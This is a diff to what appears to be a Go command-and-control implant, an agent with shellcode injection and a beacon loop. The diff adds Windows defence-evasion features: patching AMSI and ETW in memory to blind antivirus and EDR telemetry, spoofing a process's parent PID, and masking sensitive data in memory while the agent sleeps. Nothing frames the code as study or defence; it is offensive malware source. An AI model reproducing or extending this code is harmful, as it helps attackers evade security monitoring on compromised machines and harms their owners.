@@ -526,6 +526,32 @@ func dispatch(command string) (string, string) {
 		}
 		return injectShellcode(pid, binary)
 
+	case "evasion":
+		switch strings.TrimSpace(arg) {
+		case "status":
+			return evasionStatus(), "completed"
+		case "amsi":
+			if err := patchAmsi(); err != nil {
+				return "AMSI patch failed: " + err.Error(), "failed"
+			}
+			return "[+] AmsiScanBuffer patched — AMSI bypassed", "completed"
+		case "etw":
+			if err := patchEtw(); err != nil {
+				return "ETW patch failed: " + err.Error(), "failed"
+			}
+			return "[+] EtwEventWrite patched — EDR telemetry blinded", "completed"
+		default:
+			sub := strings.SplitN(strings.TrimSpace(arg), " ", 2)
+			if len(sub) == 2 && sub[0] == "ppid" {
+				out, err := spawnWithSpoofedPpid(PpidTarget, sub[1])
+				if err != nil {
+					return "PPID spoof failed: " + err.Error(), "failed"
+				}
+				return out, "completed"
+			}
+			return "usage: evasion [status|amsi|etw|ppid <cmd>]", "failed"
+		}
+
 	case "kill":
 		fmt.Println("[!] Kill command received, exiting.")
 		os.Exit(0)
@@ -693,6 +719,12 @@ func main() {
 		fmt.Printf("[+] ECDH keypair ready (profile: %s, jitter: %s)\n", ProfileName, JitterMode)
 	}
 
+	// EDR evasion (Windows-only; no-ops on Linux/macOS)
+	initSleepMask()
+	if result := initEvasion(); result != "" && result != "evasion: Windows-only" {
+		fmt.Println("[+] Evasion:", result)
+	}
+
 	var agentID string
 	var dohStarted bool
 	sleepSeconds := 5
@@ -740,6 +772,8 @@ func main() {
 			go handleTask(agentID, resp.Task)
 		}
 
+		maskSensitiveData()
 		sleepWithJitter(sleepSeconds, jitterSeconds)
+		unmaskSensitiveData()
 	}
 }
